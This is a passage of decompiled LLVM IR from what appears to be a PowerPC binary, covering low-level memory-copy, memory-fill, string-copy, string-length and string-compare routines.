dec_label_pc_10006da0:                            ; preds = %dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge, %dec_label_pc_10006d98
  %v1_10006dac.pre = phi i32 [ %v0_10006d98, %dec_label_pc_10006d98 ], [ %v1_10006dac.pre.pre, %dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge ]
  %v0_10006da0 = phi i32 [ %v1_10006d90, %dec_label_pc_10006d98 ], [ %v1_10006e14, %dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10006d98 ], [ %v2_10006dfc, %dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge ]
  store i32 %v0_10006da0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10006da4

dec_label_pc_10006da4:                            ; preds = %dec_label_pc_10006da4, %dec_label_pc_10006da0
  %v1_10006dac = phi i32 [ %v2_10006db0, %dec_label_pc_10006da4 ], [ %v1_10006dac.pre, %dec_label_pc_10006da0 ]
  %v0_10006da4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006da4 = add i32 %v0_10006da4, 4
  %v2_10006da4 = inttoptr i32 %v1_10006da4 to i32*
  %v3_10006da4 = load i32, i32* %v2_10006da4, align 4
  %v1_10006da8 = add i32 %v0_10006da4, 8
  %v2_10006da8 = inttoptr i32 %v1_10006da8 to i32*
  %v3_10006da8 = load i32, i32* %v2_10006da8, align 4
  store i32 %v3_10006da8, i32* %r9.global-to-local, align 4
  store i32 %v1_10006da8, i32* %r4.global-to-local, align 4
  %v2_10006dac = add i32 %v1_10006dac, 4
  %v3_10006dac = inttoptr i32 %v2_10006dac to i32*
  store i32 %v3_10006da4, i32* %v3_10006dac, align 4
  %v0_10006db0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006db0 = load i32, i32* @r11, align 4
  %v2_10006db0 = add i32 %v1_10006db0, 8
  %v3_10006db0 = inttoptr i32 %v2_10006db0 to i32*
  store i32 %v0_10006db0, i32* %v3_10006db0, align 4
  store i32 %v2_10006db0, i32* @r11, align 4
  %v0_10006db4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006db4 = add i32 %v0_10006db4, -1
  store i32 %v1_10006db4, i32* %ctr.global-to-local, align 4
  %v2_10006db4 = icmp eq i32 %v1_10006db4, 0
  br i1 %v2_10006db4, label %dec_label_pc_10006db8, label %dec_label_pc_10006da4

dec_label_pc_10006db8:                            ; preds = %dec_label_pc_10006da4, %dec_label_pc_10006e14, %dec_label_pc_10006d88
  %.1 = phi i32 [ undef, %dec_label_pc_10006d88 ], [ %v2_10006dfc, %dec_label_pc_10006e14 ], [ %.0, %dec_label_pc_10006da4 ]
  %v1_10006db8 = urem i32 %.1, 8
  store i32 %v1_10006db8, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10006db8, 4
  br i1 %tmp, label %dec_label_pc_10006dd0, label %dec_label_pc_10006dc4

dec_label_pc_10006dc4:                            ; preds = %dec_label_pc_10006db8
  %v0_10006dc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006dc4 = add i32 %v0_10006dc4, 4
  %v2_10006dc4 = inttoptr i32 %v1_10006dc4 to i32*
  %v3_10006dc4 = load i32, i32* %v2_10006dc4, align 4
  store i32 %v1_10006dc4, i32* %r4.global-to-local, align 4
  %v1_10006dc8 = add nsw i32 %v1_10006db8, -4
  store i32 %v1_10006dc8, i32* @r5, align 4
  %v1_10006dcc = load i32, i32* @r11, align 4
  %v2_10006dcc = add i32 %v1_10006dcc, 4
  %v3_10006dcc = inttoptr i32 %v2_10006dcc to i32*
  store i32 %v3_10006dc4, i32* %v3_10006dcc, align 4
  store i32 %v2_10006dcc, i32* @r11, align 4
  %v0_10006dd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10006dd0

dec_label_pc_10006dd0:                            ; preds = %dec_label_pc_10006db8, %dec_label_pc_10006dc4
  %v0_10006dd0 = phi i32 [ %v1_10006db8, %dec_label_pc_10006db8 ], [ %v0_10006dd0.pre, %dec_label_pc_10006dc4 ]
  %v3_10006dd0 = icmp eq i32 %v0_10006dd0, 0
  %v0_10006dd4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10006dd0, i32 %v0_10006dd4)
  %v0_10006dd8 = load i32, i32* @r5, align 4
  store i32 %v0_10006dd8, i32* %ctr.global-to-local, align 4
  %v0_10006ddc = load i32, i32* %r4.global-to-local, align 4
  %v1_10006ddc = add i32 %v0_10006ddc, 3
  store i32 %v1_10006ddc, i32* %r4.global-to-local, align 4
  %v0_10006de0 = load i32, i32* @r11, align 4
  %v1_10006de0 = add i32 %v0_10006de0, 3
  store i32 %v1_10006de0, i32* %r9.global-to-local, align 4
  %v1_10006de48 = add i32 %v0_10006ddc, 4
  %v2_10006de49 = inttoptr i32 %v1_10006de48 to i8*
  %v3_10006de410 = load i8, i8* %v2_10006de49, align 1
  store i32 %v1_10006de48, i32* %r4.global-to-local, align 4
  %v3_10006de812 = add i32 %v0_10006de0, 4
  %v4_10006de813 = inttoptr i32 %v3_10006de812 to i8*
  store i8 %v3_10006de410, i8* %v4_10006de813, align 1
  store i32 %v3_10006de812, i32* %r9.global-to-local, align 4
  %v0_10006dec14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006dec15 = add i32 %v0_10006dec14, -1
  store i32 %v1_10006dec15, i32* %ctr.global-to-local, align 4
  %v2_10006dec16 = icmp eq i32 %v1_10006dec15, 0
  br i1 %v2_10006dec16, label %dec_label_pc_10006e20, label %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge

dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge: ; preds = %dec_label_pc_10006dd0, %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge
  %v3_10006de817 = phi i32 [ %v3_10006de8, %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge ], [ %v3_10006de812, %dec_label_pc_10006dd0 ]
  %v0_10006de4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10006de4 = add i32 %v0_10006de4.pre, 1
  %v2_10006de4 = inttoptr i32 %v1_10006de4 to i8*
  %v3_10006de4 = load i8, i8* %v2_10006de4, align 1
  store i32 %v1_10006de4, i32* %r4.global-to-local, align 4
  %v3_10006de8 = add i32 %v3_10006de817, 1
  %v4_10006de8 = inttoptr i32 %v3_10006de8 to i8*
  store i8 %v3_10006de4, i8* %v4_10006de8, align 1
  store i32 %v3_10006de8, i32* %r9.global-to-local, align 4
  %v0_10006dec = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006dec = add i32 %v0_10006dec, -1
  store i32 %v1_10006dec, i32* %ctr.global-to-local, align 4
  %v2_10006dec = icmp eq i32 %v1_10006dec, 0
  br i1 %v2_10006dec, label %dec_label_pc_10006e20, label %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge

dec_label_pc_10006df4:                            ; preds = %dec_label_pc_10006d98
  %v1_10006df4 = sub nsw i32 4, %v1_10006d98
  store i32 %v1_10006df4, i32* %ctr.global-to-local, align 4
  %v1_10006dfc = load i32, i32* @r5, align 4
  %v2_10006dfc = sub i32 %v1_10006dfc, %v1_10006df4
  br label %dec_label_pc_10006e00

dec_label_pc_10006e00:                            ; preds = %dec_label_pc_10006e00, %dec_label_pc_10006df4
  %v2_10006e08 = phi i32 [ %v1_10006e0c, %dec_label_pc_10006e00 ], [ %v0_10006d98, %dec_label_pc_10006df4 ]
  %v0_10006e00 = load i32, i32* %r4.global-to-local, align 4
  %v1_10006e00 = add i32 %v0_10006e00, 4
  %v2_10006e00 = inttoptr i32 %v1_10006e00 to i8*
  %v3_10006e00 = load i8, i8* %v2_10006e00, align 1
  %v1_10006e04 = add i32 %v0_10006e00, 1
  store i32 %v1_10006e04, i32* %r4.global-to-local, align 4
  %v3_10006e08 = add i32 %v2_10006e08, 4
  %v4_10006e08 = inttoptr i32 %v3_10006e08 to i8*
  store i8 %v3_10006e00, i8* %v4_10006e08, align 1
  %v0_10006e0c = load i32, i32* @r11, align 4
  %v1_10006e0c = add i32 %v0_10006e0c, 1
  store i32 %v1_10006e0c, i32* @r11, align 4
  %v0_10006e10 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e10 = add i32 %v0_10006e10, -1
  store i32 %v1_10006e10, i32* %ctr.global-to-local, align 4
  %v2_10006e10 = icmp eq i32 %v1_10006e10, 0
  br i1 %v2_10006e10, label %dec_label_pc_10006e14, label %dec_label_pc_10006e00

dec_label_pc_10006e14:                            ; preds = %dec_label_pc_10006e00
  %v1_10006e14 = call i32 @__asm_rlwinm.(i32 %v2_10006dfc, i32 29, i32 3, i32 31)
  store i32 %v1_10006e14, i32* %r9.global-to-local, align 4
  %v4_10006e14 = icmp eq i32 %v1_10006e14, 0
  br i1 %v4_10006e14, label %dec_label_pc_10006db8, label %dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge

dec_label_pc_10006e14.dec_label_pc_10006da0_crit_edge: ; preds = %dec_label_pc_10006e14
  %v1_10006dac.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10006da0

dec_label_pc_10006e20:                            ; preds = %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge, %dec_label_pc_10006dd0
  %v0_10006e20 = load i32, i32* @r3, align 4
  ret i32 %v0_10006e20

; uselistorder directives
  uselistorder i32 %v1_10006e14, { 1, 2, 0 }
  uselistorder i32 %v1_10006e10, { 1, 0 }
  uselistorder i32 %v1_10006e0c, { 1, 0 }
  uselistorder i32 %v2_10006dfc, { 2, 1, 0 }
  uselistorder i32 %v1_10006dec, { 1, 0 }
  uselistorder i32 %v3_10006de8, { 1, 2, 0 }
  uselistorder i32 %v1_10006db8, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10006db4, { 1, 0 }
  uselistorder i32 %v2_10006db0, { 1, 2, 0 }
  uselistorder i32 %v1_10006d98, { 1, 0 }
  uselistorder i32 %v0_10006d98, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 7, 3, 2, 0, 4, 8, 5, 10, 6, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006de4.dec_label_pc_10006de4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10006dd0, { 1, 0 }
  uselistorder label %dec_label_pc_10006db8, { 1, 0, 2 }
}

define i32 @function_10006e24(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006e24:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10006e28 = add i32 %arg1, -4
  store i32 %v1_10006e28, i32* %r11.global-to-local, align 4
  %v1_10006e2c = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10006e30 = call i32 @__asm_rlwimi(i32 %v1_10006e2c, i32 16, i32 0, i32 15)
  %v2_10006e30 = trunc i32 %v1_10006e30 to i8
  %v1_10006e34 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10006e34, i32* %r9.global-to-local, align 4
  %v4_10006e34 = icmp eq i32 %v1_10006e34, 0
  br i1 %v4_10006e34, label %dec_label_pc_10006e5c, label %dec_label_pc_10006e3c

dec_label_pc_10006e3c:                            ; preds = %dec_label_pc_10006e24
  %v0_10006e3c = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e3c = urem i32 %v0_10006e3c, 4
  %v3_10006e3c = icmp eq i32 %v1_10006e3c, 0
  br i1 %v3_10006e3c, label %dec_label_pc_10006e44, label %dec_label_pc_10006e8c

dec_label_pc_10006e44:                            ; preds = %dec_label_pc_10006ea4.dec_label_pc_10006e44_crit_edge, %dec_label_pc_10006e3c
  %v0_10006e48.pre = phi i32 [ %v0_10006e48.pre.pre, %dec_label_pc_10006ea4.dec_label_pc_10006e44_crit_edge ], [ %v0_10006e3c, %dec_label_pc_10006e3c ]
  %v0_10006e44 = phi i32 [ %v1_10006ea4, %dec_label_pc_10006ea4.dec_label_pc_10006e44_crit_edge ], [ %v1_10006e34, %dec_label_pc_10006e3c ]
  store i32 %v0_10006e44, i32* %ctr.global-to-local, align 4
  %v1_10006e4c = sext i8 %v2_10006e30 to i32
  br label %dec_label_pc_10006e48

dec_label_pc_10006e48:                            ; preds = %dec_label_pc_10006e48, %dec_label_pc_10006e44
  %v0_10006e48 = phi i32 [ %v1_10006e54, %dec_label_pc_10006e48 ], [ %v0_10006e48.pre, %dec_label_pc_10006e44 ]
  %v1_10006e48 = add i32 %v0_10006e48, 4
  store i32 %v1_10006e48, i32* %r9.global-to-local, align 4
  %v4_10006e4c = inttoptr i32 %v1_10006e48 to i32*
  store i32 %v1_10006e4c, i32* %v4_10006e4c, align 4
  %v2_10006e50 = load i32, i32* %r9.global-to-local, align 4
  %v3_10006e50 = add i32 %v2_10006e50, 4
  %v4_10006e50 = inttoptr i32 %v3_10006e50 to i32*
  store i32 %v1_10006e4c, i32* %v4_10006e50, align 4
  %v0_10006e54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006e54 = add i32 %v0_10006e54, 4
  store i32 %v1_10006e54, i32* %r11.global-to-local, align 4
  %v0_10006e58 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e58 = add i32 %v0_10006e58, -1
  store i32 %v1_10006e58, i32* %ctr.global-to-local, align 4
  %v2_10006e58 = icmp eq i32 %v1_10006e58, 0
  br i1 %v2_10006e58, label %dec_label_pc_10006e5c, label %dec_label_pc_10006e48

dec_label_pc_10006e5c:                            ; preds = %dec_label_pc_10006e48, %dec_label_pc_10006ea4, %dec_label_pc_10006e24
  %v0_10006e5c = load i32, i32* %r5.global-to-local, align 4
  %v1_10006e5c = urem i32 %v0_10006e5c, 8
  store i32 %v1_10006e5c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10006e5c, 4
  br i1 %tmp, label %dec_label_pc_10006e70, label %dec_label_pc_10006e68

dec_label_pc_10006e68:                            ; preds = %dec_label_pc_10006e5c
  %v1_10006e68 = sext i8 %v2_10006e30 to i32
  %v2_10006e68 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006e68 = add i32 %v2_10006e68, 4
  %v4_10006e68 = inttoptr i32 %v3_10006e68 to i32*
  store i32 %v1_10006e68, i32* %v4_10006e68, align 4
  store i32 %v3_10006e68, i32* %r11.global-to-local, align 4
  %v0_10006e6c = load i32, i32* @r5, align 4
  %v1_10006e6c = add i32 %v0_10006e6c, -4
  store i32 %v1_10006e6c, i32* @r5, align 4
  br label %dec_label_pc_10006e70

dec_label_pc_10006e70:                            ; preds = %dec_label_pc_10006e5c, %dec_label_pc_10006e68
  %v0_10006e70 = phi i32 [ %v1_10006e5c, %dec_label_pc_10006e5c ], [ %v1_10006e6c, %dec_label_pc_10006e68 ]
  %v3_10006e70 = icmp eq i32 %v0_10006e70, 0
  %v0_10006e74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10006e70, i32 %v0_10006e74)
  %v0_10006e78 = load i32, i32* @r5, align 4
  store i32 %v0_10006e78, i32* %ctr.global-to-local, align 4
  %v0_10006e7c = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e7c = add i32 %v0_10006e7c, 3
  store i32 %v1_10006e7c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006e80

dec_label_pc_10006e80:                            ; preds = %dec_label_pc_10006e80, %dec_label_pc_10006e70
  %v3_10006e80 = phi i32 [ %v4_10006e80, %dec_label_pc_10006e80 ], [ %v1_10006e7c, %dec_label_pc_10006e70 ]
  %v4_10006e80 = add i32 %v3_10006e80, 1
  %v5_10006e80 = inttoptr i32 %v4_10006e80 to i8*
  store i8 %v2_10006e30, i8* %v5_10006e80, align 1
  store i32 %v4_10006e80, i32* %r9.global-to-local, align 4
  %v0_10006e84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006e84 = add i32 %v0_10006e84, -1
  store i32 %v1_10006e84, i32* %ctr.global-to-local, align 4
  %v2_10006e84 = icmp eq i32 %v1_10006e84, 0
  br i1 %v2_10006e84, label %dec_label_pc_10006eb0, label %dec_label_pc_10006e80

dec_label_pc_10006e8c:                            ; preds = %dec_label_pc_10006e3c
  %v1_10006e8c = sub nsw i32 4, %v1_10006e3c
  store i32 %v1_10006e8c, i32* %ctr.global-to-local, align 4
  %v1_10006e94 = load i32, i32* %r5.global-to-local, align 4
  %v2_10006e94 = sub i32 %v1_10006e94, %v1_10006e8c
  store i32 %v2_10006e94, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10006e98

dec_label_pc_10006e98:                            ; preds = %dec_label_pc_10006e98, %dec_label_pc_10006e8c
  %v3_10006e98 = phi i32 [ %v1_10006e9c, %dec_label_pc_10006e98 ], [ %v0_10006e3c, %dec_label_pc_10006e8c ]
  %v4_10006e98 = add i32 %v3_10006e98, 4
  %v5_10006e98 = inttoptr i32 %v4_10006e98 to i8*
  store i8 %v2_10006e30, i8* %v5_10006e98, align 1
  %v0_10006e9c = load i32, i32* %r11.global-to-local, align 4
  %v1_10006e9c = add i32 %v0_10006e9c, 1
  store i32 %v1_10006e9c, i32* %r11.global-to-local, align 4
  %v0_10006ea0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006ea0 = add i32 %v0_10006ea0, -1
  store i32 %v1_10006ea0, i32* %ctr.global-to-local, align 4
  %v2_10006ea0 = icmp eq i32 %v1_10006ea0, 0
  br i1 %v2_10006ea0, label %dec_label_pc_10006ea4, label %dec_label_pc_10006e98

dec_label_pc_10006ea4:                            ; preds = %dec_label_pc_10006e98
  %v0_10006ea4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10006ea4 = call i32 @__asm_rlwinm.(i32 %v0_10006ea4, i32 29, i32 3, i32 31)
  store i32 %v1_10006ea4, i32* %r9.global-to-local, align 4
  %v4_10006ea4 = icmp eq i32 %v1_10006ea4, 0
  br i1 %v4_10006ea4, label %dec_label_pc_10006e5c, label %dec_label_pc_10006ea4.dec_label_pc_10006e44_crit_edge

dec_label_pc_10006ea4.dec_label_pc_10006e44_crit_edge: ; preds = %dec_label_pc_10006ea4
  %v0_10006e48.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006e44

dec_label_pc_10006eb0:                            ; preds = %dec_label_pc_10006e80
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10006ea4, { 1, 2, 0 }
  uselistorder i32 %v1_10006ea0, { 1, 0 }
  uselistorder i32 %v1_10006e9c, { 1, 0 }
  uselistorder i32 %v1_10006e84, { 1, 0 }
  uselistorder i32 %v4_10006e80, { 1, 2, 0 }
  uselistorder i32 %v1_10006e5c, { 2, 1, 0 }
  uselistorder i32 %v1_10006e58, { 1, 0 }
  uselistorder i32 %v1_10006e54, { 1, 0 }
  uselistorder i32 %v1_10006e3c, { 1, 0 }
  uselistorder i32 %v0_10006e3c, { 2, 1, 0 }
  uselistorder i8 %v2_10006e30, { 3, 2, 0, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_10006e70, { 1, 0 }
  uselistorder label %dec_label_pc_10006e5c, { 1, 0, 2 }
}

define i32 @function_10006eb4(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_10006eb4:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10006eb4 = add i32 %arg1, -1
  %v1_10006eb8 = sub i32 %v2_10006eb4, %tmp
  store i32 %v1_10006eb8, i32* %r9.global-to-local, align 4
  %v2_10006ebc4 = load i8, i8* %arg2, align 1
  %v1_10006ec06 = add i32 %tmp, 1
  store i32 %v1_10006ec06, i32* %r4.global-to-local, align 4
  %v3_10006ec48 = icmp eq i8 %v2_10006ebc4, 0
  store i1 %v3_10006ec48, i1* %cr7_eq.global-to-local, align 1
  %v5_10006ec89 = inttoptr i32 %arg1 to i8*
  store i8 %v2_10006ebc4, i8* %v5_10006ec89, align 1
  %v0_10006ecc10 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006ecc10, label %dec_label_pc_10006ed0, label %dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge

dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge: ; preds = %dec_label_pc_10006eb4, %dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge
  %v0_10006ebc.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_10006ec8.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006ebc = inttoptr i32 %v0_10006ebc.pre to i8*
  %v2_10006ebc = load i8, i8* %v1_10006ebc, align 1
  %v1_10006ec0 = add i32 %v0_10006ebc.pre, 1
  store i32 %v1_10006ec0, i32* %r4.global-to-local, align 4
  %v3_10006ec4 = icmp eq i8 %v2_10006ebc, 0
  store i1 %v3_10006ec4, i1* %cr7_eq.global-to-local, align 1
  %v4_10006ec8 = add i32 %v1_10006ec0, %v2_10006ec8.pre
  %v5_10006ec8 = inttoptr i32 %v4_10006ec8 to i8*
  store i8 %v2_10006ebc, i8* %v5_10006ec8, align 1
  %v0_10006ecc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10006ecc, label %dec_label_pc_10006ed0, label %dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge

dec_label_pc_10006ed0:                            ; preds = %dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge, %dec_label_pc_10006eb4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006ebc.dec_label_pc_10006ebc_crit_edge, { 1, 0 }
}

define i32 @function_10006ed4() local_unnamed_addr {
dec_label_pc_10006ed4:
  %v0_10006ed4 = load i32, i32* @r3, align 4
  %v1_10006eec3 = urem i32 %v0_10006ed4, 4
  %v3_10006eec5 = icmp eq i32 %v1_10006eec3, 0
  br i1 %v3_10006eec5, label %dec_label_pc_10006ef4, label %dec_label_pc_10006edc

dec_label_pc_10006edc:                            ; preds = %dec_label_pc_10006ed4, %dec_label_pc_10006ee8
  %v0_10006ee8 = phi i32 [ %v1_10006ee8, %dec_label_pc_10006ee8 ], [ %v0_10006ed4, %dec_label_pc_10006ed4 ]
  %v1_10006edc = inttoptr i32 %v0_10006ee8 to i8*
  %v2_10006edc = load i8, i8* %v1_10006edc, align 1
  %v3_10006ee0 = icmp eq i8 %v2_10006edc, 0
  br i1 %v3_10006ee0, label %dec_label_pc_10006f28, label %dec_label_pc_10006ee8

dec_label_pc_10006ee8:                            ; preds = %dec_label_pc_10006edc
  %v1_10006ee8 = add i32 %v0_10006ee8, 1
  %v1_10006eec = urem i32 %v1_10006ee8, 4
  %v3_10006eec = icmp eq i32 %v1_10006eec, 0
  br i1 %v3_10006eec, label %dec_label_pc_10006ef4, label %dec_label_pc_10006edc

dec_label_pc_10006ef4:                            ; preds = %dec_label_pc_10006ee8, %dec_label_pc_10006ed4
  %v0_10006ef8 = phi i32 [ %v0_10006ed4, %dec_label_pc_10006ed4 ], [ %v1_10006ee8, %dec_label_pc_10006ee8 ]
  br label %dec_label_pc_10006f00

dec_label_pc_10006f00:                            ; preds = %dec_label_pc_10006f60, %dec_label_pc_10006f00, %dec_label_pc_10006ef4
  %v1_10006f3c = phi i32 [ %v0_10006ef8, %dec_label_pc_10006ef4 ], [ %v1_10006f04, %dec_label_pc_10006f00 ], [ %v1_10006f04, %dec_label_pc_10006f60 ]
  %v1_10006f00 = inttoptr i32 %v1_10006f3c to i32*
  %v2_10006f00 = load i32, i32* %v1_10006f00, align 4
  %v1_10006f04 = add i32 %v1_10006f3c, 4
  %v1_10006f10 = add i32 %v2_10006f00, -16843009
  %v2_10006f14 = and i32 %v1_10006f10, -2139062144
  %v5_10006f14 = icmp eq i32 %v2_10006f14, 0
  br i1 %v5_10006f14, label %dec_label_pc_10006f00, label %dec_label_pc_10006f1c

dec_label_pc_10006f1c:                            ; preds = %dec_label_pc_10006f00
  %v2_10006f1c = inttoptr i32 %v1_10006f3c to i8*
  %v3_10006f1c = load i8, i8* %v2_10006f1c, align 1
  %v3_10006f20 = icmp eq i8 %v3_10006f1c, 0
  br i1 %v3_10006f20, label %dec_label_pc_10006f28, label %dec_label_pc_10006f30

dec_label_pc_10006f28:                            ; preds = %dec_label_pc_10006edc, %dec_label_pc_10006f1c
  %v1_10006f28 = phi i32 [ %v1_10006f3c, %dec_label_pc_10006f1c ], [ %v0_10006ee8, %dec_label_pc_10006edc ]
  %v2_10006f28 = sub i32 %v1_10006f28, %v0_10006ed4
  ret i32 %v2_10006f28

dec_label_pc_10006f30:                            ; preds = %dec_label_pc_10006f1c
  %v1_10006f30 = add i32 %v1_10006f3c, 1
  %v2_10006f30 = inttoptr i32 %v1_10006f30 to i8*
  %v3_10006f30 = load i8, i8* %v2_10006f30, align 1
  %v3_10006f34 = icmp eq i8 %v3_10006f30, 0
  br i1 %v3_10006f34, label %dec_label_pc_10006f3c, label %dec_label_pc_10006f48

dec_label_pc_10006f3c:                            ; preds = %dec_label_pc_10006f30
  %v2_10006f3c = sub i32 %v1_10006f3c, %v0_10006ed4
  %v1_10006f40 = add i32 %v2_10006f3c, 1
  ret i32 %v1_10006f40

dec_label_pc_10006f48:                            ; preds = %dec_label_pc_10006f30
  %v1_10006f48 = add i32 %v1_10006f3c, 2
  %v2_10006f48 = inttoptr i32 %v1_10006f48 to i8*
  %v3_10006f48 = load i8, i8* %v2_10006f48, align 1
  %v3_10006f4c = icmp eq i8 %v3_10006f48, 0
  br i1 %v3_10006f4c, label %dec_label_pc_10006f54, label %dec_label_pc_10006f60

dec_label_pc_10006f54:                            ; preds = %dec_label_pc_10006f48
  %v2_10006f54 = sub i32 %v1_10006f3c, %v0_10006ed4
  %v1_10006f58 = add i32 %v2_10006f54, 2
  ret i32 %v1_10006f58

dec_label_pc_10006f60:                            ; preds = %dec_label_pc_10006f48
  %v1_10006f60 = add i32 %v1_10006f3c, 3
  %v2_10006f60 = inttoptr i32 %v1_10006f60 to i8*
  %v3_10006f60 = load i8, i8* %v2_10006f60, align 1
  %v3_10006f64 = icmp eq i8 %v3_10006f60, 0
  br i1 %v3_10006f64, label %dec_label_pc_10006f6c, label %dec_label_pc_10006f00

dec_label_pc_10006f6c:                            ; preds = %dec_label_pc_10006f60
  %v2_10006f6c = sub i32 %v1_10006f3c, %v0_10006ed4
  %v1_10006f70 = add i32 %v2_10006f6c, 3
  ret i32 %v1_10006f70

; uselistorder directives
  uselistorder i32 %v1_10006f04, { 1, 0 }
  uselistorder i32 %v1_10006f3c, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10006ee8, { 1, 0, 2 }
  uselistorder i32 %v0_10006ed4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10006f28, { 1, 0 }
  uselistorder label %dec_label_pc_10006edc, { 1, 0 }
}

define i32 @function_10006f78(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10006f78:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp21 = icmp ult i32 %arg2, 4
  br i1 %tmp21, label %dec_label_pc_10007050, label %dec_label_pc_10006f8c

dec_label_pc_10006f8c:                            ; preds = %dec_label_pc_10006f78
  %v1_10006f8c = udiv i32 %arg2, 4
  %v0_10006f9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10006f94

dec_label_pc_10006f94:                            ; preds = %dec_label_pc_1000701c, %dec_label_pc_10006f8c
  %v0_1000701c = phi i32 [ %v1_1000701c, %dec_label_pc_1000701c ], [ %v1_10006f8c, %dec_label_pc_10006f8c ]
  %v0_10006fb4 = phi i32 [ %v1_10006fd8, %dec_label_pc_1000701c ], [ %v0_10006f9c.pre, %dec_label_pc_10006f8c ]
  %v0_10006fb0 = phi i32 [ %v1_10006fcc, %dec_label_pc_1000701c ], [ %tmp, %dec_label_pc_10006f8c ]
  %v1_10006f94 = inttoptr i32 %v0_10006fb0 to i8*
  %v2_10006f94 = load i8, i8* %v1_10006f94, align 1
  %v1_10006f9c = inttoptr i32 %v0_10006fb4 to i8*
  %v2_10006f9c = load i8, i8* %v1_10006f9c, align 1
  %v3_10006fa0 = icmp eq i8 %v2_10006f94, 0
  %v4_10006fa4.not = icmp ne i8 %v2_10006f94, %v2_10006f9c
  %brmerge = or i1 %v3_10006fa0, %v4_10006fa4.not
  br i1 %brmerge, label %dec_label_pc_10006ffc, label %dec_label_pc_10006fb0

dec_label_pc_10006fb0:                            ; preds = %dec_label_pc_10006f94
  %v1_10006f98 = add i32 %v0_10006fb0, 1
  %v2_10006fb0 = inttoptr i32 %v1_10006f98 to i8*
